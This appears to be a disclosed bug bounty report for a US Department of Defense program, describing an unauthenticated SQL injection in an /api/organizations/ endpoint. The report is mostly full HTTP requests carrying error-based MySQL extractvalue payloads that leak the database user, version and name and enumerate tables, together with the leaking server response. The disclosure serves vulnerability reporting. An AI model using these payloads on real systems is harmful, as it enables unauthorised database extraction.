# Unauthenticated SQL Injection at █████████  [HtUS]

## Report Details
- **Report ID**: 1626226
- **URL**: https://hackerone.com/reports/1626226
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-05T14:03:32.420Z
- **Disclosed**: 2022-10-14T17:54:41.604Z

## Reporter
- **Username**: 0xd0ff9
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Summary
Hi team, I found Unauthenticated SQL Injection at ██████. Because of non-filter and non-escape input at API /api/organizations/*, attacker can inject malicious payload after single quote (') to exploit and extract database.

## Step to Reproduce:

Execute Request
```
GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers



```


Then the response is 

```
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 209
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-DNS-Prefetch-Control: off
Expect-CT: max-age=0
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
Origin-Agent-Cluster: ?1
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
X-XSS-Protection: 0
Strict-Transport-Security: max-age=31536000
Expires: Tue, 05 Jul 2022 04:12:11 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Tue, 05 Jul 2022 04:12:11 GMT
Connection: keep-alive

{"statusCode":500,"code":"P2010","error":"Internal Server Error","message":"\nInvalid `prisma.queryRaw()` invocation:\n\n\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':█████████'`"}
```


The result was leaked by SQL XPATH Error, so we get user() = ████████

Change query to version() we get version = 8.0.23
https://██████/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa

Change query to version() we get database = ███
https://███/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa

█████████
██████████
███
To extract data, we use this requests
```
GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers


```

█████

## Impact

Attacker can extract database from server █████

## Attachments
No attachments
